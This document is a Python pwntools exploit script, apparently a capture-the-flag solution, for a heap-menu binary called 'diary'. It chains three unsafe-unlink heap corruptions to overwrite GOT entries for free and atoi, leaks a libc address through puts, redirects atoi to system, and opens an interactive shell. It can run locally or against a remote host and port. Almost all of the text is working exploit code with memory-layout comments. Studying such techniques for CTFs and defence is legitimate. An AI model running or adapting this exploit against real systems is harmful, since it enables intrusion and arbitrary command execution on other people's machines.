# --==[[ Triple unsafe unlink

from pwn import *

atoi_got   = 0x602060
free_got   = 0x602018
puts_plt   = 0x4006e6
atoi_off   = 0x39ea0
sys_off    = 0x46590

def alloc(size, data):

    r.sendlineafter('>> ', '1')
    r.sendlineafter('Size: ', str(size))

    if size > len(data):
        data += '\n'
    r.sendafter('Data: ', data)

    return

def edit(idx, data):

    r.sendlineafter('>> ', '2')
    r.sendlineafter('Index: ', str(idx))
    r.sendafter('Data: ', data)

    return

def free(idx):

    r.sendlineafter('>> ', '3')
    r.sendlineafter('Index: ', str(idx))

    return

def leak(idx):

    r.sendlineafter('>> ', '3')
    r.sendlineafter('Index: ', str(idx))

    return u64(r.recv(6).ljust(8, '\x00'))


def pwn():

    alloc(0x88, 'A'*0x88) # chunk 0
    alloc(0x88, 'B'*0x88) # chunk 1
    alloc(0x88, 'C'*0x88) # chunk 2
    alloc(0x88, 'D'*0x88) # chunk 3
    alloc(0x88, 'E'*0x88) # chunk 4
    alloc(0x88, 'F'*0x88) # chunk 5
    alloc(0x88, 'G'*0x88) # chunk 6
    alloc(0x88, 'H'*0x88) # chunk 7
    alloc(0x88, 'I'*0x88) # chunk 8
    alloc(0x88, 'J'*0x88) # chunk 9
    alloc(0x88, 'K'*0x88) # chunk 10
    alloc(0x88, 'L'*0x88) # chunk 11
    alloc(0x88, 'M'*0x88) # chunk 12


    # --==[[ unsafe unlink no.1
    array       = 0x6020d8
    fd          = array - (3*8)
    bk          = array - (2*8)

    fake_chunk  = p64(0)
    fake_chunk += p64(0x8)
    fake_chunk += p64(fd)
    fake_chunk += p64(bk)
    fake_chunk += 'A'*0x60
    fake_chunk += p64(0x80)
    fake_chunk += p8(0x90)
    
    edit(3, fake_chunk)
    
    # unlink
    free(4)

    # 0x6020d0 <array+16>:  0x0000000000603130  0x00000000006020c0 <-- &array[0]

    edit(3, p64(free_got)[0:3])

    ###################################################################
    #                              [free's GOT]
    #   0x6020c0 <array>:       0x0000000000602018  0x00000000006030a0
    #   0x6020d0 <array+16>:    0x0000000000603130  0x00000000006020c0
    #
    ###################################################################

    # --==[[ unsafe unlink no.2
    array       = 0x6020e8
    fd          = array - (3*8)
    bk          = array - (2*8)

    fake_chunk  = p64(0)
    fake_chunk += p64(0x8)
    fake_chunk += p64(fd)
    fake_chunk += p64(bk)
    fake_chunk += 'A'*0x60
    fake_chunk += p64(0x80)
    fake_chunk += p8(0x90)

    edit(5, fake_chunk)

    # unlink
    free(6)

    ###################################################################
    #                               [free's GOT]
    #   0x6020c0 <array>:       0x0000000000602018  0x00000000006030a0
    #   0x6020d0 <array+16>:    0x0000000000603130  0x00000000006020c0 <-- &array[0]
    #   0x6020e0 <array+32>:    0x0000000000000000  0x00000000006020d0 <-- &array[2]
    #
    ###################################################################

    edit(5, p64(atoi_got)[0:3])

    ###################################################################
    #                               [free's GOT]
    #   0x6020c0 <array>:       0x0000000000602018  0x00000000006030a0
    #                               [atoi's GOT]
    #   0x6020d0 <array+16>:    0x0000000000602060  0x00000000006020c0 <-- &array[0]
    #   0x6020e0 <array+32>:    0x0000000000000000  0x00000000006020d0 <-- &array[2]
    #
    ###################################################################

    
    # --==[[ unsafe unlink no.3
    array       = 0x602118
    fd          = array - (3*8)
    bk          = array - (2*8)

    fake_chunk  = p64(0)
    fake_chunk += p64(0x8)
    fake_chunk += p64(fd)
    fake_chunk += p64(bk)
    fake_chunk += 'A'*0x60
    fake_chunk += p64(0x80)
    fake_chunk += p8(0x90)

    edit(11, fake_chunk)
    
    # unlink
    free(12)

    ###################################################################
    #                               [free's GOT]
    #   0x6020c0 <array>:       0x0000000000602018  0x00000000006030a0
    #                               [atoi's GOT]
    #   0x6020d0 <array+16>:    0x0000000000602060  0x00000000006020c0 <-- &array[0]
    #   0x6020e0 <array+32>:    0x0000000000000000  0x00000000006020d0 <-- &array[2]
    #   0x6020f0 <array+48>:    0x0000000000000000  0x0000000000603400
    #   0x602100 <array+64>:    0x0000000000603490  0x0000000000603520
    #   0x602110 <array+80>:    0x00000000006035b0  0x0000000000602100 <-- &array[8]
    #
    ###################################################################

    edit(11, p64(atoi_got)[0:3])
    
    # free => puts
    edit(0, p64(puts_plt)[0:6])

    # Leak atoi
    atoi   = leak(2)
    libc   = atoi - atoi_off
    system = libc + sys_off

    log.info("atoi:   0x{:x}".format(atoi))
    log.info("Libc:   0x{:x}".format(libc))
    log.info("system: 0x{:x}".format(system))
    
    # atoi => system
    edit(8, p64(system)[0:6])
    
    r.sendline('sh')
    
    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./diary')
        pause()
        pwn()
